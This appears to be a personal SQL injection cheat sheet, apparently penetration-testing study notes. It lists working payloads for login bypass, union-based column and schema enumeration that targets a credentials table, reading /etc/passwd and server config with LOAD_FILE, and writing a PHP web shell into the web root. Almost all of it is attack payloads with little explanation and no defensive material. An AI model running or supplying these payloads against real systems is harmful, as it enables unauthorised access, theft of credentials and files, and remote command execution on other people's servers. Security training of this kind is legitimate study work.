# error based 

- used to bypass auth

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

- OR based payloads

```sql
admin' or '1'='1
```

- commnet based 

```sql
admin'--
```

```sql
admin') --
```

- original sql

```sql
SELECT * FROM logins where (username='admin')
```

- to get the user with id 5

```sql
random' OR id = 5) --   
```

# Union based

- used to get unauth data
- first we need to get the data size

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- - <- breaks here means the query has 3 columns
```

- same with the UNION

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -    <- Correct here means the query has 3 columns
```


- we get the DBMS version

```sql
' UNION select 1,@@version,3,4-- -
```

- Other payloads :

```sql
SELECT @@version

SELECT POW(1,1)

SELECT SLEEP(5)
```

## INFORMATION_SCHEMA Database

- ti identify all the databases

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

- find the current database

```sql
cn' UNION select 1,database(),2,3-- -
```

- we find the table name 

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- find the columne 

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```


## Reading Files

- user enum 

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

- User Privileges

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'THE_USER"-- -
```

- to read data from files

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

- web root enum 

```sql
') UNION SELECT 1,2,3,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -
```
## Writing Files

- checking the `secure_file_priv` global variable.

```sql
' union SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" -- -
```

- writing files 

```sql
' union  SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt' -- -
```

- webshell

```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

